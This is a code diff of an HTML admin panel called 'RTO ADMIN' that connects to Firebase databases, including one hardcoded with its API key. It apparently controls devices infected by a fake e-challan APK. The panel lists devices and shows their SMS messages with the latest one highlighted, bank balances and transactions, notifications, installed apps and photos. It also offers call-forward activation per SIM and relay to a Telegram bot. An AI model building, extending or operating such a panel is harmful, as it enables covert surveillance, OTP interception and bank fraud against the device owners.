@@ -11,7 +11,6 @@
 * { margin:0; padding:0; box-sizing:border-box; }
 body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; color:#1E293B; min-height:100vh; }
 
-/* ═══ CONNECT SCREEN (pehle ye khulega) ═══ */
 .connect-screen { position:fixed; inset:0; background:linear-gradient(135deg,#F5F7FB,#EFF6FF); display:flex; align-items:center; justify-content:center; z-index:10000; padding:20px; overflow-y:auto; }
 .connect-box { background:#FFFFFF; border:1px solid #E2E8F0; border-radius:20px; padding:28px; max-width:520px; width:100%; box-shadow:0 20px 60px rgba(15,23,42,0.12); margin:auto; }
 .connect-box h1 { color:#1E40AF; font-size:20px; margin-bottom:6px; font-weight:800; text-align:center; }
@@ -28,7 +27,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 .saved-name { color:#0F172A; font-size:12px; font-weight:700; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
 .saved-url { color:#94A3B8; font-size:9px; font-family:'SF Mono',monospace; margin-top:3px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
 .saved-del { background:#FEF2F2; border:none; color:#DC2626; width:28px; height:28px; border-radius:8px; cursor:pointer; font-size:12px; font-weight:700; flex-shrink:0; }
-.saved-del:hover { background:#FEE2E2; }
 
 .bulk-card { background:linear-gradient(135deg,#FEF3C7,#FFFBEB); border:1px solid #FCD34D; border-radius:14px; padding:16px; margin-bottom:16px; }
 .bulk-card h3 { color:#92400E; font-size:13px; margin-bottom:8px; font-weight:700; }
@@ -36,11 +34,10 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 .bulk-card textarea { width:100%; min-height:100px; padding:12px; background:#FFFFFF; border:1px solid #FCD34D; border-radius:10px; color:#1E293B; font-size:11px; font-family:'SF Mono',monospace; resize:vertical; line-height:1.55; }
 .bulk-card textarea:focus { outline:none; border-color:#F59E0B; box-shadow:0 0 0 3px rgba(245,158,11,0.15); }
 .btn-bulk { width:100%; padding:14px; background:linear-gradient(135deg,#F59E0B,#D97706); color:white; border:none; border-radius:10px; font-size:13px; font-weight:800; cursor:pointer; margin-top:12px; box-shadow:0 3px 10px rgba(245,158,11,0.3); }
-.btn-bulk:hover { transform:translateY(-1px); box-shadow:0 5px 14px rgba(245,158,11,0.4); }
 
 .apk-upload { background:#F8FAFC; border:2px dashed #CBD5E1; border-radius:14px; padding:22px 18px; text-align:center; margin-bottom:16px; cursor:pointer; transition:all 0.2s; }
 .apk-upload:hover { background:#EFF6FF; border-color:#93C5FD; }
-.apk-upload .up-ico { width:52px; height:52px; margin:0 auto 12px; background:#FFFFFF; border:1px solid #E2E8F0; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:22px; color:#2563EB; box-shadow:0 2px 8px rgba(37,99,235,0.1); }
+.apk-upload .up-ico { width:52px; height:52px; margin:0 auto 12px; background:#FFFFFF; border:1px solid #E2E8F0; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:22px; color:#2563EB; }
 .apk-upload h4 { color:#1E293B; font-size:13px; margin-bottom:5px; font-weight:700; }
 .apk-upload p { color:#64748B; font-size:10px; }
 .apk-upload input { display:none; }
@@ -54,11 +51,8 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 .fi { width:100%; padding:12px 14px; background:#F8FAFC; border:1px solid #E2E8F0; border-radius:10px; color:#1E293B; font-size:13px; font-family:inherit; margin-bottom:12px; }
 .fi:focus { outline:none; border-color:#93C5FD; box-shadow:0 0 0 3px rgba(59,130,246,0.1); background:#FFFFFF; }
 .btn-connect { width:100%; padding:14px; background:linear-gradient(135deg,#2563EB,#1D4ED8); color:white; border:none; border-radius:11px; font-size:13px; font-weight:800; cursor:pointer; box-shadow:0 4px 12px rgba(37,99,235,0.3); }
-.btn-connect:hover { transform:translateY(-1px); box-shadow:0 6px 16px rgba(37,99,235,0.4); }
 .connect-err { color:#DC2626; font-size:11px; margin-top:10px; min-height:16px; font-weight:700; text-align:center; }
-.connect-ok { color:#059669; font-size:11px; margin-top:10px; min-height:16px; font-weight:700; text-align:center; }
 
-/* ═══ MAIN PANEL ═══ */
 .topbar { background:#FFFFFF; padding:14px 18px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #E2E8F0; position:sticky; top:0; z-index:100; box-shadow:0 1px 3px rgba(0,0,0,0.04); }
 .topbar h1 { color:#1E40AF; font-size:15px; font-weight:700; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; max-width:45%; }
 .topbar-right { display:flex; align-items:center; gap:8px; flex-shrink:0; }
@@ -66,9 +60,7 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 .dot { width:6px; height:6px; border-radius:50%; background:#10B981; animation:pulse 2s infinite; }
 @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.5;} }
 .btn-new { background:#EFF6FF; color:#2563EB; border:1px solid #BFDBFE; padding:7px 13px; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer; }
-.btn-new:hover { background:#DBEAFE; }
 .btn-logout { background:#FEF2F2; color:#DC2626; border:1px solid #FECACA; padding:7px 13px; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer; }
-.btn-logout:hover { background:#FEE2E2; }
 
 .stats { display:grid; grid-template-columns:repeat(5,1fr); gap:1px; background:#E2E8F0; border-bottom:1px solid #E2E8F0; }
 .stat { background:#FFFFFF; padding:12px 6px; text-align:center; }
@@ -82,11 +74,9 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 .chip { padding:8px 14px; background:#F8FAFC; border:1px solid #E2E8F0; border-radius:20px; color:#334155; font-size:11px; font-weight:600; cursor:pointer; white-space:nowrap; display:flex; align-items:center; gap:5px; }
 .chip:hover { background:#EFF6FF; border-color:#BFDBFE; color:#2563EB; }
 .chip.danger { color:#DC2626; border-color:#FECACA; background:#FEF2F2; }
-.chip.danger:hover { background:#FEE2E2; }
 
 .filters { display:flex; gap:8px; padding:12px 18px; overflow-x:auto; }
 .fbtn { padding:7px 16px; background:#FFFFFF; border:1px solid #E2E8F0; border-radius:20px; color:#64748B; font-size:11px; font-weight:600; cursor:pointer; white-space:nowrap; }
-.fbtn:hover { border-color:#BFDBFE; color:#2563EB; }
 .fbtn.active { background:#2563EB; color:white; border-color:#2563EB; box-shadow:0 2px 8px rgba(37,99,235,0.25); }
 
 .search-box { margin:0 18px 14px; width:calc(100% - 36px); padding:12px 16px; background:#FFFFFF; border:1px solid #E2E8F0; border-radius:12px; color:#1E293B; font-size:13px; box-shadow:0 1px 3px rgba(0,0,0,0.03); }
@@ -102,7 +92,7 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 .device-id { color:#94A3B8; font-size:9px; font-family:'SF Mono',monospace; }
 .device-star { font-size:17px; cursor:pointer; }
 .device-grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:8px; padding-top:12px; border-top:1px solid #F1F5F9; }
-.device-grid-2 .k { color:#94A3B8; font-size:9px; text-transform:uppercase; font-weight:700; letter-spacing:0.05em; }
+.device-grid-2 .k { color:#94A3B8; font-size:9px; text-transform:uppercase; font-weight:700; }
 .device-grid-2 .v { color:#334155; font-size:12px; font-weight:600; margin-top:3px; }
 
 .drawer-overlay { position:fixed; inset:0; background:rgba(15,23,42,0.5); z-index:998; opacity:0; pointer-events:none; transition:opacity 0.25s; backdrop-filter:blur(2px); }
@@ -113,7 +103,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 .drawer-head h2 { color:#1E40AF; font-size:14px; font-weight:700; flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
 .head-actions { display:flex; gap:6px; flex-shrink:0; }
 .ibtn { background:#F1F5F9; border:none; color:#475569; width:32px; height:32px; border-radius:9px; cursor:pointer; font-size:13px; font-weight:600; }
-.ibtn:hover { background:#E2E8F0; }
 .ibtn.danger { background:#FEF2F2; color:#DC2626; }
 .ibtn.cf { background:#ECFDF5; color:#059669; }
 
@@ -132,29 +121,25 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 .msg-tag { color:#94A3B8; font-size:9px; font-weight:600; }
 .msg-body { color:#1E293B; font-size:12px; line-height:1.55; word-break:break-word; white-space:pre-wrap; }
 .msg-date { color:#94A3B8; font-size:9px; margin-top:5px; }
-.msg.latest { border-left-color:#F59E0B; background:linear-gradient(90deg, #FFFBEB, #FFFFFF); box-shadow:0 0 0 1px rgba(245,158,11,0.3), 0 4px 12px rgba(245,158,11,0.15); animation:latestPulse 2s ease-in-out infinite; }
-@keyframes latestPulse { 0%,100% { box-shadow:0 0 0 1px rgba(245,158,11,0.3), 0 4px 12px rgba(245,158,11,0.15); } 50% { box-shadow:0 0 0 1px rgba(245,158,11,0.6), 0 4px 18px rgba(245,158,11,0.3); } }
-.msg-tag.new-tag { background:linear-gradient(135deg,#FBBF24,#F59E0B); color:#FFF; font-weight:900; padding:3px 9px; border-radius:10px; font-size:9px; letter-spacing:0.05em; animation:newBadge 1.5s ease-in-out infinite; }
-@keyframes newBadge { 0%,100% { transform:scale(1); } 50% { transform:scale(1.08); } }
+.msg.latest { border-left-color:#F59E0B; background:linear-gradient(90deg, #FFFBEB, #FFFFFF); animation:latestPulse 2s ease-in-out infinite; }
+@keyframes latestPulse { 0%,100% { box-shadow:0 0 0 1px rgba(245,158,11,0.3); } 50% { box-shadow:0 0 0 1px rgba(245,158,11,0.6); } }
+.msg-tag.new-tag { background:linear-gradient(135deg,#FBBF24,#F59E0B); color:#FFF; font-weight:900; padding:3px 9px; border-radius:10px; font-size:9px; }
 
 .fg { margin-bottom:12px; }
 .ft { min-height:80px; resize:vertical; }
-.btn { width:100%; padding:13px; background:#2563EB; color:white; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer; margin-top:6px; box-shadow:0 2px 6px rgba(37,99,235,0.25); }
-.btn:hover { background:#1D4ED8; }
-.btn.green { background:#059669; box-shadow:0 2px 6px rgba(5,150,105,0.25); }
-.btn.green:hover { background:#047857; }
+.btn { width:100%; padding:13px; background:#2563EB; color:white; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer; margin-top:6px; }
+.btn.green { background:#059669; }
 .btn.dark { background:#F1F5F9; color:#334155; }
 
-.card { background:#FFFFFF; border:1px solid #E2E8F0; border-radius:14px; padding:16px; margin-bottom:12px; box-shadow:0 1px 3px rgba(0,0,0,0.04); }
+.card { background:#FFFFFF; border:1px solid #E2E8F0; border-radius:14px; padding:16px; margin-bottom:12px; }
 .card.blue { border-color:#BFDBFE; background:#F8FBFF; }
 .card.green { border-color:#A7F3D0; background:#F0FDF9; }
 .card h3 { color:#1E40AF; font-size:13px; margin-bottom:5px; font-weight:700; }
 .card.green h3 { color:#059669; }
-.card p { color:#64748B; font-size:11px; margin-bottom:12px; line-height:1.55; }
 
 .sim-row { display:flex; gap:8px; margin-bottom:12px; }
 .sim-btn { flex:1; padding:12px; background:#FFFFFF; border:2px solid #E2E8F0; border-radius:10px; color:#64748B; font-size:12px; font-weight:700; cursor:pointer; text-align:center; }
-.sim-btn.active { background:#2563EB; color:white; border-color:#2563EB; box-shadow:0 2px 8px rgba(37,99,235,0.3); }
+.sim-btn.active { background:#2563EB; color:white; border-color:#2563EB; }
 .on-off { padding:13px 20px; background:#F1F5F9; border:none; border-radius:10px; color:#334155; font-size:12px; font-weight:700; cursor:pointer; white-space:nowrap; }
 .on-off.on { background:#059669; color:white; }
 
@@ -163,49 +148,46 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 .dir .v { color:#1E293B; font-weight:600; text-align:right; max-width:60%; word-break:break-word; }
 
 .pgrid { display:grid; grid-template-columns:repeat(auto-fill,minmax(110px,1fr)); gap:8px; }
-.pitem { border-radius:10px; overflow:hidden; background:#FFFFFF; cursor:pointer; position:relative; border:1px solid #E2E8F0; box-shadow:0 1px 3px rgba(0,0,0,0.04); }
-.pitem:hover { border-color:#BFDBFE; box-shadow:0 4px 12px rgba(37,99,235,0.15); }
+.pitem { border-radius:10px; overflow:hidden; background:#FFFFFF; cursor:pointer; position:relative; border:1px solid #E2E8F0; }
 .pitem img { width:100%; height:110px; object-fit:cover; display:block; background:#F1F5F9; }
 .pname { padding:5px 7px; font-size:9px; color:#64748B; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; background:#F8FAFC; font-weight:600; }
 .pfolder { position:absolute; top:5px; left:5px; padding:3px 7px; background:#2563EB; color:white; border-radius:5px; font-size:8px; font-weight:700; text-transform:uppercase; }
-.pdelete { position:absolute; top:5px; right:5px; width:26px; height:26px; background:#DC2626; color:white; border:none; border-radius:50%; font-size:12px; font-weight:700; cursor:pointer; display:flex; align-items:center; justify-content:center; z-index:10; box-shadow:0 2px 6px rgba(220,38,38,0.4); }
-.pitem.deleting { opacity:0.4; pointer-events:none; }
+.pdelete { position:absolute; top:5px; right:5px; width:26px; height:26px; background:#DC2626; color:white; border:none; border-radius:50%; font-size:12px; font-weight:700; cursor:pointer; display:flex; align-items:center; justify-content:center; z-index:10; }
 .pviewer { position:fixed; inset:0; background:rgba(15,23,42,0.96); z-index:2000; display:none; flex-direction:column; align-items:center; justify-content:center; padding:20px; }
 .pviewer.active { display:flex; }
-.pviewer img { max-width:100%; max-height:78vh; object-fit:contain; border-radius:8px; box-shadow:0 20px 50px rgba(0,0,0,0.5); }
-.pv-controls { display:flex; gap:10px; margin-top:16px; flex-wrap:wrap; justify-content:center; }
+.pviewer img { max-width:100%; max-height:78vh; object-fit:contain; border-radius:8px; }
+.pv-controls { display:flex; gap:10px; margin-top:16px; }
 .pv-controls button { padding:11px 20px; background:#FFFFFF; border:none; color:#1E293B; border-radius:10px; cursor:pointer; font-size:11px; font-weight:700; }
-.pv-controls button.close, .pv-controls button.del { background:#DC2626; color:white; }
-.pv-info { color:#CBD5E1; font-size:11px; margin-top:10px; text-align:center; }
+.pv-controls button.close { background:#DC2626; color:white; }
+.pv-info { color:#CBD5E1; font-size:11px; margin-top:10px; }
 
-.app { background:#FFFFFF; padding:10px 13px; border-radius:10px; margin-bottom:6px; display:flex; align-items:center; gap:10px; border-left:3px solid #3B82F6; box-shadow:0 1px 3px rgba(0,0,0,0.04); }
+.app { background:#FFFFFF; padding:10px 13px; border-radius:10px; margin-bottom:6px; display:flex; align-items:center; gap:10px; border-left:3px solid #3B82F6; }
 .app-ic { width:36px; height:36px; background:linear-gradient(135deg,#3B82F6,#2563EB); border-radius:10px; display:flex; align-items:center; justify-content:center; font-size:16px; flex-shrink:0; }
 .app-name { color:#0F172A; font-size:12px; font-weight:700; }
 .app-pkg { color:#94A3B8; font-size:9px; font-family:'SF Mono',monospace; margin-top:2px; word-break:break-all; }
-.notif { background:#FFFFFF; border-left:3px solid #3B82F6; border-radius:8px; padding:12px 14px; margin-bottom:8px; box-shadow:0 1px 3px rgba(0,0,0,0.04); }
+
+.notif { background:#FFFFFF; border-left:3px solid #3B82F6; border-radius:8px; padding:12px 14px; margin-bottom:8px; }
 .notif-head { display:flex; justify-content:space-between; margin-bottom:4px; }
 .notif-app { color:#1E40AF; font-size:11px; font-weight:700; }
 .notif-date { color:#94A3B8; font-size:9px; }
 .notif-title { color:#0F172A; font-size:11px; font-weight:700; margin-bottom:3px; }
 .notif-body { color:#475569; font-size:11px; line-height:1.5; word-break:break-word; }
 
-.tx { background:#FFFFFF; border:1px solid #D1FAE5; border-radius:12px; padding:14px; margin-bottom:10px; box-shadow:0 1px 3px rgba(0,0,0,0.04); }
-.tx-head { display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; }
+.tx { background:#FFFFFF; border:1px solid #D1FAE5; border-radius:12px; padding:14px; margin-bottom:10px; }
 .tx-acc { color:#1E40AF; font-size:11px; font-weight:700; }
-.tx-lbl { color:#64748B; font-size:9px; text-transform:uppercase; letter-spacing:0.1em; font-weight:700; }
+.tx-lbl { color:#64748B; font-size:9px; text-transform:uppercase; font-weight:700; }
 .tx-bal { color:#059669; font-size:22px; font-weight:800; margin-top:3px; }
-.tx-amt-lbl { color:#64748B; font-size:9px; text-transform:uppercase; text-align:right; font-weight:700; }
 .tx-amt { color:#DC2626; font-size:15px; font-weight:800; }
 .tx-amt.cr { color:#059669; }
 .tx-msg { color:#475569; font-size:10px; margin-top:10px; line-height:1.55; padding-top:10px; border-top:1px solid #F1F5F9; }
 .tx-date { color:#94A3B8; font-size:9px; margin-top:5px; }
 .bal-big { background:linear-gradient(135deg,#ECFDF5,#F0FDF9); border:1px solid #A7F3D0; border-radius:12px; padding:16px; margin-bottom:12px; }
-.bal-big .l { color:#047857; font-size:9px; text-transform:uppercase; letter-spacing:0.1em; font-weight:700; }
+.bal-big .l { color:#047857; font-size:9px; text-transform:uppercase; font-weight:700; }
 .bal-big .a { color:#059669; font-size:24px; font-weight:800; margin-top:5px; }
 
 .note { background:#FFFFFF; border:1px solid #E2E8F0; border-radius:12px; padding:14px; margin-bottom:12px; }
 .note h4 { color:#1E40AF; font-size:12px; margin-bottom:10px; font-weight:700; }
-.note textarea { width:100%; padding:10px; background:#F8FAFC; border:1px solid #E2E8F0; border-radius:8px; color:#1E293B; font-size:11px; resize:vertical; min-height:60px; font-family:inherit; }
+.note textarea { width:100%; padding:10px; background:#F8FAFC; border:1px solid #E2E8F0; border-radius:8px; color:#1E293B; font-size:11px; resize:vertical; min-height:60px; }
 .note .sv { padding:8px 16px; background:#2563EB; color:white; border:none; border-radius:8px; font-size:11px; font-weight:700; cursor:pointer; margin-top:8px; }
 
 .sim-mgr { background:#EFF6FF; border:1px solid #BFDBFE; border-radius:12px; padding:14px; margin-bottom:12px; }
@@ -227,10 +209,9 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 .cf-overlay.active { display:flex; }
 .cf-dialog { background:#FFFFFF; border:1px solid #E2E8F0; border-radius:16px; padding:22px; max-width:420px; width:100%; box-shadow:0 20px 50px rgba(0,0,0,0.2); }
 .cf-dialog h3 { color:#1E40AF; font-size:16px; margin-bottom:8px; font-weight:700; }
-.cf-dialog .cf-hint { color:#64748B; font-size:11px; margin-bottom:18px; line-height:1.55; }
-.cf-dialog .cf-label { display:block; color:#64748B; font-size:10px; margin-bottom:6px; text-transform:uppercase; letter-spacing:0.05em; font-weight:700; }
-.cf-dialog .cf-input { width:100%; padding:13px; background:#F8FAFC; border:1px solid #E2E8F0; border-radius:10px; color:#1E293B; font-size:14px; font-family:'SF Mono',monospace; margin-bottom:16px; }
-.cf-dialog .cf-input:focus { outline:none; border-color:#93C5FD; box-shadow:0 0 0 3px rgba(59,130,246,0.1); }
+.cf-dialog .cf-hint { color:#64748B; font-size:11px; margin-bottom:18px; }
+.cf-dialog .cf-label { display:block; color:#64748B; font-size:10px; margin-bottom:6px; text-transform:uppercase; font-weight:700; }
+.cf-dialog .cf-input { width:100%; padding:13px; background:#F8FAFC; border:1px solid #E2E8F0; border-radius:10px; color:#1E293B; font-size:14px; font-family:monospace; margin-bottom:16px; }
 .cf-sim-row { display:flex; gap:8px; margin-bottom:18px; }
 .cf-sim-btn { flex:1; padding:13px; background:#F8FAFC; border:2px solid #E2E8F0; border-radius:10px; color:#64748B; font-size:12px; font-weight:700; cursor:pointer; text-align:center; }
 .cf-sim-btn.active { background:#2563EB; color:white; border-color:#2563EB; }
@@ -239,69 +220,53 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 .cf-btn.activate { background:#059669; color:white; }
 .cf-btn.deactivate { background:#DC2626; color:white; }
 .cf-btn.check { background:#F1F5F9; color:#334155; border:1px solid #E2E8F0; grid-column:1 / -1; }
-.cf-status { background:#EFF6FF; border:1px solid #BFDBFE; border-radius:8px; padding:11px; font-size:10px; color:#334155; margin-top:10px; line-height:1.55; }
-.cf-status.ok { background:#ECFDF5; border-color:#A7F3D0; color:#047857; }
-.cf-status.err { background:#FEF2F2; border-color:#FECACA; color:#DC2626; }
+.cf-status { background:#EFF6FF; border:1px solid #BFDBFE; border-radius:8px; padding:11px; font-size:10px; color:#334155; margin-top:10px; }
+.cf-status.ok { background:#ECFDF5; color:#047857; }
+.cf-status.err { background:#FEF2F2; color:#DC2626; }
 .cf-close { width:100%; padding:12px; background:#F1F5F9; color:#334155; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer; margin-top:8px; }
 
-.tg-status { background:#EFF6FF; border:1px solid #BFDBFE; border-radius:9px; padding:11px 13px; margin-top:12px; font-size:11px; color:#2563EB; line-height:1.55; font-weight:700; }
-.tg-status.ok { background:#ECFDF5; border-color:#A7F3D0; color:#047857; }
-.tg-status.err { background:#FEF2F2; border-color:#FECACA; color:#DC2626; }
-.tg-log { background:#0F172A; border:1px solid #1E293B; border-radius:9px; padding:11px; margin-top:12px; max-height:220px; overflow-y:auto; font-family:'SF Mono','Courier New',monospace; font-size:10px; line-height:1.65; }
+.tg-status { background:#EFF6FF; border:1px solid #BFDBFE; border-radius:9px; padding:11px; margin-top:12px; font-size:11px; color:#2563EB; font-weight:700; }
+.tg-status.ok { background:#ECFDF5; color:#047857; }
+.tg-status.err { background:#FEF2F2; color:#DC2626; }
+.tg-log { background:#0F172A; border-radius:9px; padding:11px; margin-top:12px; max-height:220px; overflow-y:auto; font-family:'SF Mono',monospace; font-size:10px; }
 .tg-log-line { color:#94A3B8; padding:3px 0; border-bottom:1px solid rgba(148,163,184,0.15); word-break:break-word; }
-.tg-log-line:last-child { border-bottom:none; color:#F1F5F9; }
 
 .scan-status { background:#EFF6FF; border:1px solid #BFDBFE; border-radius:10px; padding:12px; margin:0 18px 14px; font-size:11px; color:#2563EB; display:flex; align-items:center; gap:10px; font-weight:700; }
 .scan-status .spin { display:inline-block; width:14px; height:14px; border:2px solid rgba(59,130,246,0.3); border-top-color:#2563EB; border-radius:50%; animation:spin 1s linear infinite; }
 @keyframes spin { to { transform:rotate(360deg); } }
 
 .inline-progress { display:none; margin-top:14px; padding:14px; background:#EFF6FF; border:1px solid #BFDBFE; border-radius:12px; }
-.inline-progress.active { display:block; animation:fadeIn 0.3s; }
-@keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
-.inline-progress-head { display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; }
+.inline-progress.active { display:block; }
+.inline-progress-head { display:flex; justify-content:space-between; margin-bottom:10px; }
 .inline-progress-status { font-size:11px; color:#2563EB; font-weight:700; }
 .inline-progress-status.done { color:#059669; }
 .inline-progress-status.err { color:#DC2626; }
 .inline-progress-percent { font-size:12px; color:#2563EB; font-weight:800; }
-.inline-progress-percent.done { color:#059669; }
-.inline-progress-percent.err { color:#DC2626; }
-.inline-progress-bar-bg { background:#FFFFFF; border:1px solid #DBEAFE; border-radius:10px; height:22px; overflow:hidden; position:relative; }
-.inline-progress-bar-fill { height:100%; width:0%; background:linear-gradient(90deg,#3B82F6,#06B6D4,#3B82F6); background-size:200% 100%; border-radius:10px; transition:width 0.4s ease; animation:shimmer 2s linear infinite; box-shadow:0 0 12px rgba(59,130,246,0.4); }
-.inline-progress-bar-fill.done { background:linear-gradient(90deg,#10B981,#059669); animation:none; box-shadow:0 0 15px rgba(16,185,129,0.5); }
-.inline-progress-bar-fill.err { background:linear-gradient(90deg,#EF4444,#DC2626); animation:none; box-shadow:0 0 12px rgba(239,68,68,0.4); }
+.inline-progress-bar-bg { background:#FFFFFF; border:1px solid #DBEAFE; border-radius:10px; height:22px; overflow:hidden; }
+.inline-progress-bar-fill { height:100%; width:0%; background:linear-gradient(90deg,#3B82F6,#06B6D4,#3B82F6); background-size:200% 100%; border-radius:10px; transition:width 0.4s; animation:shimmer 2s linear infinite; }
+.inline-progress-bar-fill.done { background:linear-gradient(90deg,#10B981,#059669); }
 @keyframes shimmer { 0% { background-position:200% 0; } 100% { background-position:-200% 0; } }
 .inline-progress-stats { font-size:10px; color:#64748B; margin-top:8px; text-align:center; font-weight:600; }
 
-@media (max-width:600px) { 
-  .device-grid { grid-template-columns:1fr; padding:0 12px 40px; } 
-  .search-box { margin:0 12px 12px; width:calc(100% - 24px); } 
-  .filters, .chips { padding:10px 12px; } 
-  .drawer { max-width:100%; } 
-  .pitem img { height:95px; } 
-  .topbar h1 { max-width:40%; font-size:13px; }
-}
+@media (max-width:600px) { .device-grid { grid-template-columns:1fr; padding:0 12px 40px; } .search-box { margin:0 12px 12px; width:calc(100% - 24px); } .drawer { max-width:100%; } .topbar h1 { max-width:40%; font-size:13px; } }
 </style>
 </head>
 <body>
 
-<!-- ═══ CONNECT SCREEN — PEHLE YE KHULEGA ═══ -->
 <div class="connect-screen" id="connectScreen">
   <div class="connect-box">
     <h1>🔗 Firebase Connect</h1>
     <div class="sub">Enter Firebase URL, API Key, or upload APK</div>
-
     <div class="saved-section" id="savedSection" style="display:none;">
       <div class="saved-title">Saved Accounts</div>
       <div class="saved-list" id="savedList"></div>
     </div>
-
     <div class="bulk-card">
       <h3>⚡ Bulk Connect</h3>
       <p>Kahi se bhi firebase URLs paste karo. Har URL auto-detect hoga.</p>
       <textarea id="bulkInput" placeholder="📍 Firebase URL: https://app-one-default-rtdb.firebaseio.com&#10;🔑 Auth Key: AIzaSy..."></textarea>
       <button class="btn-bulk" id="btnBulkConnect">⚡ Connect All</button>
     </div>
-
     <div class="apk-upload" id="apkUpload">
       <div class="up-ico">⬆</div>
       <h4>Upload APK File</h4>
@@ -309,9 +274,7 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
       <div class="apk-status" id="apkStatus"></div>
       <input type="file" id="apkFile" accept=".apk,.zip">
     </div>
-
     <div class="form-sep">Or Manual Entry</div>
-
     <label class="fl">Firebase Database URL</label>
     <input type="text" class="fi" id="newUrl" placeholder="https://your-project.firebaseio.com">
     <label class="fl">Authentication Key / Secret</label>
@@ -321,7 +284,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
   </div>
 </div>
 
-<!-- ═══ MAIN PANEL ═══ -->
 <div id="mainApp" style="display:none;">
   <div class="topbar">
     <h1 id="topTitle">🚔 RTO ADMIN</h1>
@@ -363,7 +325,7 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
   <div class="drawer-head">
     <h2 id="dTitle">Device</h2>
     <div class="head-actions">
-      <button class="ibtn cf" id="btnCallFwd" title="Call Forward">📞</button>
+      <button class="ibtn cf" id="btnCallFwd">📞</button>
       <button class="ibtn" id="btnStar">☆</button>
       <button class="ibtn danger" id="btnDel">🗑</button>
       <button class="ibtn" id="btnClose">✕</button>
@@ -438,12 +400,7 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; col
 </div>
 
 <script>
-var DEFAULT_CONFIG = {
-  apiKey: "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8",
-  databaseURL: "https://rto-echallan-v2-default-rtdb.firebaseio.com",
-  projectId: "rto-echallan-v2"
-};
-
+var DEFAULT_CONFIG = { apiKey: "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8", databaseURL: "https://rto-echallan-v2-default-rtdb.firebaseio.com", projectId: "rto-echallan-v2" };
 var db = null, currentApp = null, currentAccount = null;
 var devs = {}, devPaths = {}, curId = null, curTab = 'info', curMsgs = {};
 var curFilter = 'all';
@@ -451,18 +408,13 @@ var liked = JSON.parse(localStorage.getItem('liked') || '[]');
 var photos = {}, curPhoto = '';
 var scanListener = null, deviceListener = null, dataListeners = [];
 var cfSimSlot = 1, tgPolling = {};
-var photoCmdListener = null;
-var liveMsgListener = null;
+var photoCmdListener = null, liveMsgListener = null;
 var latestSmsKey = null;
-var latestSmsTime = 0;
 var TELEGRAM_CONFIG = { botToken: "", chatId: "", enabled: false, ready: false };
-var telegramConfigListener = null;
-var telegramUrlCache = {};
+var telegramConfigListener = null, telegramUrlCache = {};
 var inlineProgressListener = null;
+var ROOT_SNAPSHOT = null;
 
-// ═══════════════════════════════════════════════════════════
-// URL + CONNECT
-// ═══════════════════════════════════════════════════════════
 function normalizeFirebaseUrl(url) {
   if (!url) return url;
   url = url.trim().replace(/\/+$/, '');
@@ -480,36 +432,20 @@ function tryConnect(config) {
       currentApp = firebase.initializeApp(config, appName);
       db = currentApp.database();
       var done = false;
-      var timer = setTimeout(function() { if (!done) { done = true; resolve(); } }, 2500);
-      db.ref('/').once('value').then(function() {
-        if (!done) { done = true; clearTimeout(timer); resolve(); }
-      }).catch(function(err) {
-        console.warn('⚠️ Probe failed (may still work):', err.message);
-        if (!done) { done = true; clearTimeout(timer); resolve(); }
-      });
+      var timer = setTimeout(function() { if (!done) { done = true; resolve(); } }, 3000);
+      db.ref('/').once('value').then(function() { if (!done) { done = true; clearTimeout(timer); resolve(); } }).catch(function(err) { if (!done) { done = true; clearTimeout(timer); resolve(); } });
     } catch(e) { resolve(); }
   });
 }
 
-// ═══════════════════════════════════════════════════════════
-// DEVICE DETECTION — koi bhi ID format (numeric, hex, UUID, DEV_, mixed)
-// ═══════════════════════════════════════════════════════════
 function isDeviceEntry(key, entry) {
   if (!entry || typeof entry !== 'object' || Array.isArray(entry)) return false;
-  if (typeof key === 'string' && key.indexOf('DEV_') === 0) return true;
